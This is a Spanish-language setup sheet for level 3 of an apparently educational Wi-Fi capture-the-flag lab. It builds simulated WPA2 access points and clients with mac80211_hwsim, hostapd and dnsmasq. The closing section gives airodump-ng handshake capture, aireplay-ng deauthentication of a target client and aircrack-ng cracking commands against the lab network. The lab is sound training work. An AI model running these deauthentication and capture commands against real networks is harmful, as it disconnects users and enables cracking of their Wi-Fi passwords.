NIVEL 3 - CAPTURA DE HANDSHAKE WPA2 CON RUIDO CONTROLADO

Objetivo:
Capturar un handshake WPA2 válido entre un cliente y el AP objetivo.

Datos del escenario:
- AP objetivo: wlan10
- SSID objetivo: TP-Link_23412
- BSSID objetivo: 52:54:46:33:48:53
- Canal objetivo: 11
- Red objetivo: 10.10.3.0/24
- Clientes objetivo: wlan11, wlan12, wlan13, wlan14
- APs secundarios de ruido:
  - wlan15: MiFibra-9A21, BSSID 52:54:46:33:48:54, canal 6, red 10.10.31.0/24
  - wlan16: Orange-5G-4F2A, BSSID 52:54:46:33:48:55, canal 1, red 10.10.32.0/24
- Clientes secundarios: wlan17, wlan18

Notas:
- Este reparto permite lanzar Nivel 1 y Nivel 3 al mismo tiempo.
- Ejecuta estos comandos desde la raíz del proyecto CTF-Wi-Fi.
- Carga mac80211_hwsim con al menos 19 radios:
  sudo modprobe -r mac80211_hwsim 2>/dev/null || true
  sudo modprobe mac80211_hwsim radios=20

IMPORTANTE:
- Para mover interfaces WiFi virtuales de mac80211_hwsim a namespaces, no uses:
  sudo ip link set wlanX netns nombre_namespace
- Usa el PHY correspondiente con:
  sudo iw phy phyX set netns name nombre_namespace

Limpieza previa solo del Nivel 3:
  sudo pkill -F /run/level3ap.pid 2>/dev/null || true
  sudo pkill -F /run/level3fakeap1.pid 2>/dev/null || true
  sudo pkill -F /run/level3fakeap2.pid 2>/dev/null || true
  sudo pkill -F /run/level3dnsmasq.pid 2>/dev/null || true
  sudo pkill -F /run/level3dnsmasq_fake1.pid 2>/dev/null || true
  sudo pkill -F /run/level3dnsmasq_fake2.pid 2>/dev/null || true

  sudo ip netns del level3-client1 2>/dev/null || true
  sudo ip netns del level3-client2 2>/dev/null || true
  sudo ip netns del level3-client3 2>/dev/null || true
  sudo ip netns del level3-client4 2>/dev/null || true
  sudo ip netns del level3-fake-client1 2>/dev/null || true
  sudo ip netns del level3-fake-client2 2>/dev/null || true

  sudo rm -f /run/level3*.pid
  sudo rfkill unblock all

Preparar APs:
  sudo ip addr flush dev wlan10
  sudo ip addr flush dev wlan15
  sudo ip addr flush dev wlan16

  sudo ip link set wlan10 down
  sudo ip link set wlan15 down
  sudo ip link set wlan16 down

  sudo ip link set wlan10 up
  sudo ip link set wlan15 up
  sudo ip link set wlan16 up

  sudo ip addr add 10.10.3.1/24 dev wlan10
  sudo ip addr add 10.10.31.1/24 dev wlan15
  sudo ip addr add 10.10.32.1/24 dev wlan16

Levantar AP objetivo y APs secundarios:
  sudo hostapd -B -P /run/level3ap.pid lab/level3/level3ap.conf
  sudo hostapd -B -P /run/level3fakeap1.pid lab/level3/level3fakeap1.conf
  sudo hostapd -B -P /run/level3fakeap2.pid lab/level3/level3fakeap2.conf

Comprobar APs:
  sudo ps aux | grep '[h]ostapd'
  sudo iw dev wlan10 info
  sudo iw dev wlan15 info
  sudo iw dev wlan16 info

Levantar DHCP:
  sudo dnsmasq --conf-file=lab/level3/level3dnsmasq.conf --pid-file=/run/level3dnsmasq.pid
  sudo dnsmasq --conf-file=lab/level3/level3dnsmasq_fake1.conf --pid-file=/run/level3dnsmasq_fake1.pid
  sudo dnsmasq --conf-file=lab/level3/level3dnsmasq_fake2.conf --pid-file=/run/level3dnsmasq_fake2.pid

Comprobar DHCP:
  pgrep -a dnsmasq

Cliente objetivo 1:
  sudo ip netns add level3-client1 2>/dev/null || true
  PHY=$(basename "$(readlink -f /sys/class/net/wlan11/phy80211)")
  sudo ip link set wlan11 down
  sudo iw phy "$PHY" set netns name level3-client1
  sudo ip -n level3-client1 link set lo up
  sudo ip netns exec level3-client1 ip link set wlan11 up
  sudo ip netns exec level3-client1 wpa_supplicant -B -i wlan11 -c "$(pwd)/lab/level3/level3cli1.conf"
  sudo ip netns exec level3-client1 dhclient -pf /run/level3-client1-dhclient.pid -lf /run/level3-client1-dhclient.leases wlan11 >/dev/null 2>&1 &

Cliente objetivo 2:
  sudo ip netns add level3-client2 2>/dev/null || true
  PHY=$(basename "$(readlink -f /sys/class/net/wlan12/phy80211)")
  sudo ip link set wlan12 down
  sudo iw phy "$PHY" set netns name level3-client2
  sudo ip -n level3-client2 link set lo up
  sudo ip netns exec level3-client2 ip link set wlan12 up
  sudo ip netns exec level3-client2 wpa_supplicant -B -i wlan12 -c "$(pwd)/lab/level3/level3cli2.conf"
  sudo ip netns exec level3-client2 dhclient -pf /run/level3-client2-dhclient.pid -lf /run/level3-client2-dhclient.leases wlan12 >/dev/null 2>&1 &

Cliente objetivo 3:
  sudo ip netns add level3-client3 2>/dev/null || true
  PHY=$(basename "$(readlink -f /sys/class/net/wlan13/phy80211)")
  sudo ip link set wlan13 down
  sudo iw phy "$PHY" set netns name level3-client3
  sudo ip -n level3-client3 link set lo up
  sudo ip netns exec level3-client3 ip link set wlan13 up
  sudo ip netns exec level3-client3 wpa_supplicant -B -i wlan13 -c "$(pwd)/lab/level3/level3cli3.conf"
  sudo ip netns exec level3-client3 dhclient -pf /run/level3-client3-dhclient.pid -lf /run/level3-client3-dhclient.leases wlan13 >/dev/null 2>&1 &

Cliente objetivo 4:
  sudo ip netns add level3-client4 2>/dev/null || true
  PHY=$(basename "$(readlink -f /sys/class/net/wlan14/phy80211)")
  sudo ip link set wlan14 down
  sudo iw phy "$PHY" set netns name level3-client4
  sudo ip -n level3-client4 link set lo up
  sudo ip netns exec level3-client4 ip link set wlan14 up
  sudo ip netns exec level3-client4 wpa_supplicant -B -i wlan14 -c "$(pwd)/lab/level3/level3cli4.conf"
  sudo ip netns exec level3-client4 dhclient -pf /run/level3-client4-dhclient.pid -lf /run/level3-client4-dhclient.leases wlan14 >/dev/null 2>&1 &

Cliente secundario 1:
  sudo ip netns add level3-fake-client1 2>/dev/null || true
  PHY=$(basename "$(readlink -f /sys/class/net/wlan17/phy80211)")
  sudo ip link set wlan17 down
  sudo iw phy "$PHY" set netns name level3-fake-client1
  sudo ip -n level3-fake-client1 link set lo up
  sudo ip netns exec level3-fake-client1 ip link set wlan17 up
  sudo ip netns exec level3-fake-client1 wpa_supplicant -B -i wlan17 -c "$(pwd)/lab/level3/level3fakecli1.conf"
  sudo ip netns exec level3-fake-client1 dhclient -pf /run/level3-fake-client1-dhclient.pid -lf /run/level3-fake-client1-dhclient.leases wlan17 >/dev/null 2>&1 &

Cliente secundario 2:
  sudo ip netns add level3-fake-client2 2>/dev/null || true
  PHY=$(basename "$(readlink -f /sys/class/net/wlan18/phy80211)")
  sudo ip link set wlan18 down
  sudo iw phy "$PHY" set netns name level3-fake-client2
  sudo ip -n level3-fake-client2 link set lo up
  sudo ip netns exec level3-fake-client2 ip link set wlan18 up
  sudo ip netns exec level3-fake-client2 wpa_supplicant -B -i wlan18 -c "$(pwd)/lab/level3/level3fakecli2.conf"
  sudo ip netns exec level3-fake-client2 dhclient -pf /run/level3-fake-client2-dhclient.pid -lf /run/level3-fake-client2-dhclient.leases wlan18 >/dev/null 2>&1 &

Comprobación de asociación WiFi:
  sudo ip netns exec level3-client1 iw dev wlan11 link
  sudo ip netns exec level3-client2 iw dev wlan12 link
  sudo ip netns exec level3-client3 iw dev wlan13 link
  sudo ip netns exec level3-client4 iw dev wlan14 link
  sudo ip netns exec level3-fake-client1 iw dev wlan17 link
  sudo ip netns exec level3-fake-client2 iw dev wlan18 link

Comprobación de IP por DHCP:
  sudo ip netns exec level3-client1 ip addr show wlan11
  sudo ip netns exec level3-client2 ip addr show wlan12
  sudo ip netns exec level3-client3 ip addr show wlan13
  sudo ip netns exec level3-client4 ip addr show wlan14
  sudo ip netns exec level3-fake-client1 ip addr show wlan17
  sudo ip netns exec level3-fake-client2 ip addr show wlan18

Generar tráfico básico:
  sudo ip netns exec level3-client1 ping -i 1 10.10.3.1 >/dev/null 2>&1 &
  sudo ip netns exec level3-client2 ping -i 1 10.10.3.1 >/dev/null 2>&1 &
  sudo ip netns exec level3-client3 ping -i 1 10.10.3.1 >/dev/null 2>&1 &
  sudo ip netns exec level3-client4 ping -i 1 10.10.3.1 >/dev/null 2>&1 &
  sudo ip netns exec level3-fake-client1 ping -i 1 10.10.31.1 >/dev/null 2>&1 &
  sudo ip netns exec level3-fake-client2 ping -i 1 10.10.32.1 >/dev/null 2>&1 &

Escucha para capturar handshake:
  sudo airmon-ng start [interfaz]
  sudo airodump-ng --bssid 52:54:46:33:48:53 -c 11 -w captura_nivel3 [interfaz_monitor]

Forzar reconexión de un cliente objetivo:
  sudo aireplay-ng -0 3 -a 52:54:46:33:48:53 -c [MAC_CLIENTE_OBJETIVO] [interfaz_monitor]

MACs aproximadas de clientes objetivo:
  wlan11: 02:00:00:00:0b:00
  wlan12: 02:00:00:00:0c:00
  wlan13: 02:00:00:00:0d:00
  wlan14: 02:00:00:00:0e:00

Validación local opcional:
  aircrack-ng captura_nivel3-01.cap